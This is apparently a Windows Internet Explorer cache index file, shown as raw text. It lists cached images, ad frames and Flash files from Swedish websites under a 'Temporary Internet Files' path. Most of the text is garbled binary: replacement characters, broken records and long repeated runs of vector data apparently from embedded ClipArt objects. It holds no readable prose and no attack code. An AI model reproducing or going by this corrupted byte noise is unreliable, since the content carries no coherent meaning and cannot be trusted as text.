   dn[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �\@      �?                      ���݌(�E��ە�>0��� k�x�W�                                                                           noll[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     (�@                              �pje�l�5������� *:f��                                                                           topleft_a[2].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@                              t�������Q(5�/�и: �q�p�                                                                           bannertop[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      �@                              7���nM��w�T�� �q�p�                                                                           bannerrigt[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �H@      0@                      ���+�t����&��[Qt�� 0.����                                                                           pixel_osynlig[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �q@      �?                      ��O��<�T������� ����                                                                           list_bigbro_over[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     0�@                              sKrޠD.�]�W60�Ə�- ɟ\�W�                                                                           20-29[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      *@                      ��i��+�qV���/��
�N�E G
L�T�                                                                           cart_partial_large[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     Ƨ@      �?                      �SD��("����{��j��v� ̳�%A�                                                                        
��Y���|�����* ���[�                                                                           bild_macarena01[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �j@      @                      ��?��t��v���e�0� �1��\�                                                                           imp[2].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@     @p@                      hT~�]���R`�h���u10 ����                                                                           headernavi_chat_over[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �x@       @                      �MX��n�D�`?mj"��i#� � ���                                                                           bnt83x21us0kanohi-ka[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �r@      @                      �M�Hl�gv�\j���� q�6,��                                                                       ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q            \+--+     �i@      F@                      �A��D�	��~2ٚ�FۤۧW ����\�                                                                           imp[3].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    �M�@      �?                      �jV�*���9��I�U�G۳� Q�$�W�                                                                           K00-K14[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@                              m�ށ��X[�@�\_�ݾS Q�$�W�                                                                        
s�                                                                        (   551063-442373-sponsorbutton_mobil[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      �@      �?                      �)��$N6-%���-&�恧 .���W�                                                                           uggla11[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      @                      75��;&ĵgC�z�5�� � �k	���                                                                           showdeatail_fragaolle[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      @                      ���l�eu_jx����O�aN ��W�                                                                        
������� ���,���<��Q�/�j�E���W���e���p���y���~���*�   �  ���      -    �    -    -    �           -       $����������������������������z���j���Z���K���<���.���!������	�v���g���X���.������������������� ���3���G���Z���l���������������������������������0���C���V���h���{�����������������������������������	����o��V��>��'�����������������������������r��^��I�y�4�q��l��k���m���r���z����������u��p��m��k���j���j���k���l���n���i���e���c��a��`��`��`��b��d�t�f�i�i�]�m�R�q�G�u�<�y�2�~�)��� �������������������������������������������������������������u���k���a���W���N���E���=���4���,���%�������������������������������������������
�}���n���]���L���;���(������ �~���r���h��`��[��X�w�X�]�[�I�_�4�e� �l��s���z������������������y���d���O���:���&��������v���k���a���X��P��L��K�r�O�Y�Y�F�g�8�y�.���%������������������������0���D��Z��o��������������(���7���G���W�}�h�v�z�o��j��e��b���_���^���^���^��`� �c�.�f�=�k�K�p�X�v�f�|�s������k���U���A���-������
�����������������������������������������s���h���\���R���G���=���4��-��'��"���&��/��7��@��I���L���Q���V���]��d��l��v����y���k���]���Q���E���;���1���)���$����������)��4�
�Q���b���y����������m��I��%����������������������������������������������������������������������9��^�������0���K���U���`���k���w���������������� ���$���&���'���(���'��%��"���)��4��?��I��T�
�^��i��s���~��������������������������   -    -    -    -     �  $h����q���a���R���B���3���$���������������|���m���^���M���=���+������������f��)��������{�v�F�l�4�a�"�U��H��:���+����������������������������������t���]���G���2������������������������������y���d���O���9���"������
���������������������������������~���}���p���c���V���O���I���E���B���N���Y���e���p���|��������������������������������������������������������������������������������s���b���S���E���8���/���)���#�����������!��-�*��8��G�	�W��h���z���������� ����������������������������������
��	��	���x��i��[��N�&�A�1�6�=�-�J�&�Y� �j��{�������#���3���D�u�V�j�h�_�{�V��M��G��A���=���;���:��:��<�3�@�H�F�X�L�h�S�x�[��d��n��y���������������������������	���������%��*��.��1�%�2�0�1�;�.�F�'�P��W��]�
�P��D��7��)����
����������������������������������x���e���R���A���1������1���I��`��w�(��=��S��j�������������������������������~���u���l���e���_���Y���S���M���H���C���?���7���1���.���1���5���9���?���F���M���T���[���c���i���o���u���z���~������������������������{���~���~���z���r���m���h���c���^���Y���T���O���K���G���F���I���M���S���[���c���k���s���|�������������������������o��Y�p�E�\�2�F�"�/���
�
�������������������������������v�
�i��[��O��C�(�8�2�4�7�2�<�0�B�.�H�>�I�N�K�_�M�o�O�~�R��V��Z��_��e���k���r���z���������
���������#���&���&���$��������������"���*���0���4���6���8���8���6���4��/��)�t��m��h��g���h���k���p���v���~�������������������������������������������������������������������������� ������������������ ���������������������������������������������������������������������������������������������������!���#���$���"������������������������
�>��M��]���m���~�������������������������� �����#��1��M�.�h�C��Y���o����������������1���P���o���������������������8���I���O���O�Y�N�/�Q��]���w���������������������������
�a��G��.���'���6���p���N���3������
������������'���,���0���0���,���$�|��v��t��s��r��r��r��s� �t���v���z���~����������������������������������������������������w���o���h���c���_� �\�	�Z��Y��Y�#�Z�)�[�0�^�6�a�<�e�A�j�E�p�I�v�N���K���D���8���0���'������������������������������������������p��]��I��5��"���� �����������������������������x���e���S���B���3� �'���+��B��Z��r����"���&���+���0���7���>���E���L���S���X���]���b���g���k���o���r���t���v���t���m���a���]���X���T���O���K���G���D���B���@���?���=���;���9���9���:���>���A�}�E�x�I�s�N�p�S�m�X�j�^�i�d�h�l�h�u�h�}�i��l��o��t��z����������������������w���m���c���Y���O���E���;���1���(��� ��������� �����n���X���B���+����������������������������������!��$��'��+��/��5��K��a���x�����������������������������������$���5���E���V���f���v�������������������������������������!���0���?���N���\���j���x���������������������   -    -    -    -     X   $* ��o��^��N�~�?�x�0�q�"�k��f��c���`��`��b�+�c�>�b�Q�^�b�T�p�D�|�5���%������������������������������������������������������+���7���C���O���Z���e���o���y����o�   -    -    -    �  ���      -     h   $2 ��h��o��s��u���t���q���n���i��d��`��[�+�X�7�U�C�T�P�U�\�X�h�]�s�d�~�m��v��~������������������x��l�}�]�k�O�Y�B�E�:�-�8��:��>��C���I���O���W���^���f��i��j��j��i��g��e��c��b��h�   -    �    -    -    �  ���      -       $� ���������'���6���G���Z���o�������
�������
���(�h�?�6�L�   -    �    -    -    �  ���      -     &   $ \�k�X�h�O�`�D�S�9�A�1�,�0��7���K���J���G���D���B��B�%�F�=�N�U�\�k�   -    �    -    -    �  ���      -     F   $!  �.�!�-�#�)�&�#�+��1��9��A��L���W���d���r����������������!���!�����������������|��n��`��R��D��7��+�%� �.�   -    �    -    -    �  ���      -     F   $! ��������
���#��)�+�0�:�6�J�<�[�@�m�B��A���>���7���+������������
���������������"���&���*��-�t�.�_�-�I�+�2�&������   -    �    -    -    -     �   $C ���������������������y���e���Q���B���2���"���������������������������������{���j���Z���J���G���W���h���z�������������������������������$���6���I���\���n�����������������������������	����$�"�3�/�C�:�R�D�c�L�s�T���n���j���d���[�l�O�G�?�$�)��
L�T�                                                                           arrow_leftnav[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     x�@      0@                      �ds�&&6�t�mV��	�J _��^�                                                                        
   top[3].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      q@      @                      �՜�f=�R��t7�+��,>B �j�(i�                                                                        5   result;sz=468x60;kw=91%3AKarlsson;ord=7529307[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ȍ@     �F@                      �'0
 ��F^�                                                                           bg_line_black[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ȁ@      ?@                      �<��J���=�}�����tI �!�FS�                                                                           flash_icn[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     V�@      �?                      �&ϒg"3 1���|'�Ύ� >�G%A�                                                                           mammaogpappa[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+- ��
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q                                   invisiblecornernw[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     &�@      (@                      �ٶ�ی�
g��;l��|� �\�                                                                           Faces[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      @                      _�%��4��=�~4D�lWP ��W�                                                                           icon1.on[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    ��@     �R@                      ޺�[�$�n�$�u�oj�e� ��q�[�                                                                           bild_forvantansfulldate[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     L�@      �?                      �E���r��N��Q� >��PS�                                                                        
�F�V�pER��� ���\�                                                                           frame_main[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              ![0YS>g�w�ñ<��n
� 1^�H^�                                                                           sssbanner[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    @G�@      @                      �:��h���]}ᆇc�@� r�@
�                                                                           orbit_child[2].swf    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              R�rp�A`LE��VX.{� ʽ����                                                                           ny_sokning[2].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              S��;#�[r�����N!�K$� �e�PS�        ����         ����       W  �  �K   	  �%   �
���
���	�������������������������������������������������������������s���a���M���8���8���&�����������������������������������������~���s���i���^���T���J���?���3���&�������|�	�����������������{���u���o���p���t�m�t�P�j�5�e�&�_��Y�	�T���P���M���L���N���W���_���d���f�}�f�}�d�r�`�h�Z�`�R�Y�M�W�H�T�B�R�=�P�7�N�2�L�,�I�'�G�,�=�3�3�:�)�A��G��K��M���L���I���F���B���?���:���6���0���+���%�������������������������������������������������������������������������������������v���k���`���T���G���=���3���)��� �����������������������.�	�/��0���1���1���2���3���4���6���7���9���<���>���?���?���>���<���<���=���?���@��A��D�~�H�w�M�p�S�j�Y�e�`�b�h�`�p�_�}�b���g���l���l���r���z���������x��o��j�-�l�A�n�A�p�H�q�Q�p�Y�n�`�i�f�e�l�`�r�]�y�Y��V���S���P���M���L���M���N���O���P���O���O���M���F���>���7���.��%���,��?�
������������ ���!���"���"���#���%���(���*���,���.���*���'���%���#���������������� ����� �
���	�����������������������������������������������������������������������������������{���w���t���l���e���]���V���N���G���@���9���4���0���+���'���"���������������������������������%���+���0���5���8���:���;���<���;���5���-��%�x��o��a��c�
�d��f���g���h���h���i���j���k���l���l���n���s���{��������������������������������������������������������������������������������������������������������"���,���4���<��?�
�C��F��J��M�!�R�&�W�+�]�(�\�#�[��Y��X��R� �L���E���=���4���)���������������������������������������������"���%���)���/���5���<���C���J���R���Z���c���f���j���o���s���������������������������������������������������������������������� ����������� ��-��9��E��F��G��G�
�]�
�Y���X���X���X���W���Q���I��>��3� �&�+��5��?���G���E��:��0��&�%��-��4��8���9���:���:���:���;���5���0���-���*���'���$��� �����������	��� ���&���,���1���/���&� ����	��
�R��L���F���?���^���a���e���i� �l��q��v�	�z�
���������������
�/��)��#����� �"���&���*���B���Z��p�������~��|���y���v���r���n���i���o���w����������������� ���������'���5���B���6���*��������������������������������������������������������������������&���.� �6��>��G��O��W��^��^��O��A��3��&������ �����������������!��)��1��9�)�@�6�F�D�L�S�P�c�S�l�V�c�V�Z�V�R�V�I�V�@�V�7�U�/�U�'�T�'�U�#�V��V��U��T��S��R�
���
����/��B��E��J��N��R�"�b�%�v�*���5���5���5���4���4���-���'���!�������{��t�
������������ ���&���-���5���>���F���N���V���^���d���k���p���t���x���}�
���������)���3���>���B���G���M���S���Z���b���j���s���w���}�������������������������������������������������������������������������������
������*���9���I���X���h���y���|���~���������{���v���p���j���d���`���]���\���X���S�x�M�m�G�b�@�W�:�L�5�A�1�5�4�5�;�?�B�H�J�Q�S�Z�[�c�c�l�j�v�q����������������������������������������&���7���H���Y���j���{�������������������������������������������������������������������������������=���=���E���M���U���]���e���l���s���z���s���l���e���^���V���O���G���@���@���6���-���$���������
������������������������������������)���2���<���D���M���V���_���i���   -    �    -    -    �   33      -     (   $ ��{���t���y���}�������������������������������������������������������{�   -    �    -    -    �   33      -     .   $ m�u�k�o�g�l�b�i�^�g�V�g�O�h�H�k�A�l�@�n�?�p�>�q�?�s�D�u�J�w�P�y�U�{�\�{�c�{�i�z�m�u�   -    �    -    -    �   33      -     ^   $- O�C�K�B�G�A�B�@�>�@�9�?�5�>�0�>�,�=��:��6��1���,���&��� ���������
����������������������������������������{��������������������������� ���(���/���5���:��>��A�*�C�<�D�O�C�   -    �    -    -    �   33      -     &   $ ��>���?���?���?���?���?���?���?���@���B���C���D���D���C���B���@���>�   -    �    -    -    �   33      -     �   $A ��$���!����������������t��g��c��_��Z�
����.��3��9� �>�!�D�"�I�#�O�$�U�%�[�%�`�&�e�'�j�(�o�(�u�(�z�)���)���)���)���)���)���(���(���'���%���$�   -    �    -    -    �   33      -     F   $! �����������
�b��i��q��z��������������������   -    �    -    -    �   33      -     h   $2 (��������������������������������������������������|�}�t�r�k�g�b�^�W�V�K�N�>�F�2�=�&�4��)���
�#��,�/�7�A�C�S�P�c�_�q�o�}�����������������������������������������������������	���������(���(���   -    �    -    -    �   33      -     *   $ $���$������������
���	���	���
������
�����������������z���t�y�n�q�i�h�c�`�\�Y�T�R�K�L�;�A�*�7��-��%��� ���������%���'���*���,���.���0���2���5���9���9���;���>���B���G���N�
�U��^�!�e�%�o�)�y�1���4���5���7���9���;���<���>���?���A���@���>���;�	�7��5�1�6�F�9�\�>�l�C�|�J���S���X���\���_���c���g���l���s���{�������   -    �    -    -    �   33      -     8   $ o���l�y�i�k�g�]�f�M�b�8�c�!�f�
�j���k���i���i���h���f���`���c���d���c���^��U�,�R�M�U�l�b���q���o���o���   -    �    -    -    �  ���      -     �   $? ��������������������������t���h���^���R���F���;���/������������������������������������l���U���?���*���������/���D���0���0�������������������������%���6���C���O���\���i��������������������������,���W�����������������������������������������   -    �    -    -    �  ���      -     X   $* 
��$� �B� �a����������������	���
������
�������� ��)��2��;��D��>��8��2��-�   -    �    -    -    �   33      -         $ =��>��@��A��B�
������������������
���
�n��{������������������������������������������|���m���`���R� �D��7��a��a�
�   -    �    -    -    �   33      -     "  $� ��s���b���O���=���,������ ��������}���u���k���_��Y�|�R�y�L�w�E�u�>�t�6�s�/�q�(�p�+�r�/�s�3�u�7�v�;�x�?�z�C�}�G��L���Q���U���Z���Y���V���R���O���-���0���5���9���=���F���M���R���U���U���N���H���A���:���B���H���L���Q���T���X���\���a���t��p��l��h��d��`��\��X��U�
�^��f�
�j��j��j�
�)��&���#���;���R���i������������������������������������������������
�x��j��\��M��>��/�   -    �    -    -    �  ���      -     .   $ @�6�;�3�6�1�0�1�*�1�#�2��3��4��5��8��;�"�>�'�A�,�D�1�G�5�K�9�O�@�L�A�F�@�>�@�6�   -    �    -    -    �  ���      -     �   $J ����������������������������������������������������������~���z���w���t���u���w���z���}����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������   -    �    -    -    �  ���      -     d  $� ��������������������������v���k���a���^���[���Y���X���V���T���R���O���J���H���H���I���K���L���M���O���S���X���Z���Y���R���L���F���@���:���5���0���,��)�z�&�i�#�W� �W��W��V��V��^��f��n��v��}�����������������������������#���)���1���4���6���6��5��/��(���!��!�� ���
���������������������
���������������������������������������������������� ������
��
�������������������
�����������������������������������}���z���v���r���o���k���e���`���Z��S��M��F��@��:���4���.���)���)��+�	�,��,��.��1��4��6�!�7�'�8�*�9�.�9�2�;�5�?�;�H�;�Q�;�Y�;�b�;�k�;�s�<�{�>��@��I���S���_���l���y���������������������������������   -    �    -    -    �  ���      -     &   $ H���G���C���?���;���0���)���%��� ���&���,���1���7���;���@���D���H���   -    �    -    -    �  ���      -     J   $# ��k���n���q���s���r��_���[���Y���Y���Y���Z���\���]���_��`��a��b��d��g��j��m��p���r���s���t���t���r���o���k���h���e���c���d���f���k�   -    �    -    -    �  ���      -     @   $ `���a���`���]���Y���U���P���K���F���F���A���<���8���3���/���,���)���'���(���+���0���6���:���?���D���I���O���V���]���`���   -    �    -    -    �  ���      -     H   $" ������������������������������������������������������{���{�����������������������������������������������������   -    �    -                                     vegmerke_vagarbete[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �N@      "@                      �Q����X��GO	%M |+�X�                                                                           yellow_0_90_corner_round[3].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      @                      �hH <����\u�*;�?��1 ��z�[�                                                                           bild_p2avslojande[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �\@                              ��GK
 �a��U�                                                                        #   start;sz=140x350;ord=688282[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      �?                      �����P�c[�f5�P�X� =�9A�                                                                           creatives[2].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �J@                              �R�p�r�8�
�                                                                           droopy_digit[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@                              �p����<�G5���t��b ]�[�                                                                           utsigten1[1].gif    N   C:\W                  lningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      5@                      #�bHI6�RD�7T!\��� �M��[�                                                                           bild_kvinnorochgolf[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    @�@      @                      �8���Ǘp_��D��Cy���� 7|
��*����s�|�l� 4�;VG�                                                                           Player_Background5[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     \�@      �?                      �KY�V��[1�sp�����w �9��                                                                           uppfodning[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     L�@      �?                      ��������ƱKոa䕐 �O�X�                                                                        !   vegmerke_cirkulationsplats[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �y@      <@                      Q�U/���m[1̃�n
0 ae�X�                                                                           koblajjetopp[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    @��@      @                      �P���w�A��٬��7�
"� ��@
�                                                                           toonami_parent[1].swf    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �w@      :@                      -2r�`h��*L)��o��П� M5�X�                                                                        #   start;sz=140x350;ord=984099[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     @_@      m@                      Aon�m�&@���tykफ9 ·�VG�                                                                           games_casino[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �q@     �F@                      �)AyjAh���z�
  �����     �      F   Microsoft ClipArt Gallery    MS_ClipArt_Gallery    MS_ClipArt_Gallery.5 �9�q                               }L~�Z�u�u�2R�X��Тq �b�QY�                                                                           x_active[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    ���@      �?                      �j�:�t�_`2c�
������� ���,���<��Q�/�j�E���W���e���p���y���~���*�   �  ���      -    �    -    -    �           -       $����������������������������z���j���Z���K���<���.���!������	�v���g���X���.������������������� ���3���G���Z���l���������������������������������0���C���V���h���{�����������������������������������	����o��V��>��'�����������������������������r��^��I�y�4�q��l��k���m���r���z����������u��p��m��k���j���j���k���l���n���i���e���c��a��`��`��`��b��d�t�f�i�i�]�m�R�q�G�u�<�y�2�~�)��� �������������������������������������������������������������u���k���a���W���N���E���=���4���,���%�������������������������������������������
�}���n���]���L���;���(������ �~���r���h��`��[��X�w�X�]�[�I�_�4�e� �l��s���z������������������y���d���O���:���&��������v���k���a���X��P��L��K�r�O�Y�Y�F�g�8�y�.���%������������������������0���D��Z��o��������������(���7���G���W�}�h�v�z�o��j��e��b���_���^���^���^��`� �c�.�f�=�k�K�p�X�v�f�|�s������k���U���A���-������
�����������������������������������������s���h���\���R���G���=���4��-��'��"���&��/��7��@��I���L���Q���V���]��d��l��v����y���k���]���Q���E���;���1���)���$����������)��4�
�Q���b���y����������m��I��%����������������������������������������������������������������������9��^�������0���K���U���`���k���w���������������� ���$���&���'���(���'��%��"���)��4��?��I��T�
�^��i��s���~��������������������������   -    -    -    -     �  $h����q���a���R���B���3���$���������������|���m���^���M���=���+������������f��)��������{�v�F�l�4�a�"�U��H��:���+����������������������������������t���]���G���2������������������������������y���d���O���9���"������
���������������������������������~���}���p���c���V���O���I���E���B���N���Y���e���p���|��������������������������������������������������������������������������������s���b���S���E���8���/���)���#�����������!��-�*��8��G�	�W��h���z���������� ����������������������������������
��	��	���x��i��[��N�&�A�1�6�=�-�J�&�Y� �j��{�������#���3���D�u�V�j�h�_�{�V��M��G��A���=���;���:��:��<�3�@�H�F�X�L�h�S�x�[��d��n��y���������������������������	���������%��*��.��1�%�2�0�1�;�.�F�'�P��W��]�
�P��D��7��)����
����������������������������������x���e���R���A���1������1���I��`��w�(��=��S��j�������������������������������~���u���l���e���_���Y���S���M���H���C���?���7���1���.���1���5���9���?���F���M���T���[���c���i���o���u���z���~������������������������{���~���~���z���r���m���h���c���^���Y���T���O���K���G���F���I���M���S���[���c���k���s���|�������������������������o��Y�p�E�\�2�F�"�/���
�
�������������������������������v�
�i��[��O��C�(�8�2�4�7�2�<�0�B�.�H�>�I�N�K�_�M�o�O�~�R��V��Z��_��e���k���r���z���������
���������#���&���&���$��������������"���*���0���4���6���8���8���6���4��/��)�t��m��h��g���h���k���p���v���~�������������������������������������������������������������������������� ������������������ ���������������������������������������������������������������������������������������������������!���#���$���"������������������������
�>��M��]���m���~�������������������������� �����#��1��M�.�h�C��Y���o����������������1���P���o���������������������8���I���O���O�Y�N�/�Q��]���w���������������������������
�a��G��.���'���6���p���N���3������
������������'���,���0���0���,���$�|��v��t��s��r��r��r��s� �t���v���z���~����������������������������������������������������w���o���h���c���_� �\�	�Z��Y��Y�#�Z�)�[�0�^�6�a�<�e�A�j�E�p�I�v�N���K���D���8���0���'������������������������������������������p��]��I��5��"���� �����������������������������x���e���S���B���3� �'���+��B��Z��r����"���&���+���0���7���>���E���L���S���X���]���b���g���k���o���r���t���v���t���m���a���]���X���T���O���K���G���D���B���@���?���=���;���9���9���:���>���A�}�E�x�I�s�N�p�S�m�X�j�^�i�d�h�l�h�u�h�}�i��l��o��t��z����������������������w���m���c���Y���O���E���;���1���(��� ��������� �����n���X���B���+����������������������������������!��$��'��+��/��5��K��a���x�����������������������������������$���5���E���V���f���v�������������������������������������!���0���?���N���\���j���x���������������������   -    -    -    -     X   $* ��o��^��N�~�?�x�0�q�"�k��f��c���`��`��b�+�c�>�b�Q�^�b�T�p�D�|�5���%������������������������������������������������������+���7���C���O���Z���e���o���y����o�   -    -    -    �  ���      -     h   $2 ��h��o��s��u���t���q���n���i��d��`��[�+�X�7�U�C�T�P�U�\�X�h�]�s�d�~�m��v��~������������������x��l�}�]�k�O�Y�B�E�:�-�8��:��>��C���I���O���W���^���f��i��j��j��i��g��e��c��b��h�   -    �    -    -    �  ���      -       $� ���������'���6���G���Z���o�������
�������
���(�h�?�6�L�   -    �    -    -    �  ���      -     &   $ \�k�X�h�O�`�D�S�9�A�1�,�0��7���K���J���G���D���B��B�%�F�=�N�U�\�k�   -    �    -    -    �  ���      -     F   $!  �.�!�-�#�)�&�#�+��1��9��A��L���W���d���r����������������!���!�����������������|��n��`��R��D��7��+�%� �.�   -    �    -    -    �  ���      -     F   $! ��������
���#��)�+�0�:�6�J�<�[�@�m�B��A���>���7���+������������
���������������"���&���*��-�t�.�_�-�I�+�2�&������   -    �    -    -    -     �   $C ���������������������y���e���Q���B���2���"���������������������������������{���j���Z���J���G���W���h���z�������������������������������$���6���I���\���n�����������������������������	����$�"�3�/�C�:�R�D�c�L�s�T���n���j���d���[�l�O�G�?�$�)��
MR��:`�3�lH =�
q�& #�PV�                                                                        4   gladiatorerna_stortavla;sz=140x350;ord=86211[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@                              �Z�d�xĤ)�N_� ���K�                                                                           Till_huv[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@                              ��MBm���Rx�긪,{| ����A�                                                                           bubblor5[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �w@                              �bM{l��)^�e�c̓C6�� �7K�@�                                                                        
���C" ���[�                                                                           tv4gladheroskadad_1019[1].ra    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �@      @                      ���*� ��7^܅L�e�� ���[�                                                                           b_arlakossa[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �^@      �?                      f>��G��o2�Vj��K= �ѯ[�                                                                           k_pilar[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     >�@      *@                      _PI�@�e�����wB>�='� ��!ZV�                                                                        )   alltombostad;sz=140x350;ord=22483[1].html    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     Ԕ@      @                      �ޒ�R�Y�Ь�E���T��N E�K�                                                                           hobbexlogo[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    ���@      @                      
L�hӅ��Z�$i�:���w� ����                                                                           collage[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     `�@      $@                      XtD:�#�z�������OQ�� ����                                                                           valkommen[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     Ԕ@      @                      �ޒ�R�Y�Ь�E���T��N E�K�                                                                           hobbexlogo[2].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      b@      ;@                      -�q��J�`��м ne�[�                                                                           k_bondgarden_sv[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     `h@                              `Iz�»� ��1x�z��1 r�
��-?�>(\��9�u^�/� ne�[�                                                                           hogerlankar_Slice47[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+      G@       @                      �
��-?�>(\��9�u^�/� ���[�                                                                           hogerlankar_Slice12[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     �J@       @                      �HW���d_�,\��Ð_��cW ���[�                                                                           hogerlankar_Slice13[1].gif    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+    pk�@     `o@                      �wh�r����v���U �� "*�[�                                                                           h-spelatavlavinn[1].swf    N   C:\WINDOWS\Lokala inst�llningar\Temporary Internet Files\Content.IE5\ZAJTGOXP\+--+     ��@      �?                      ��y��!��a�gI�:��θ a�D
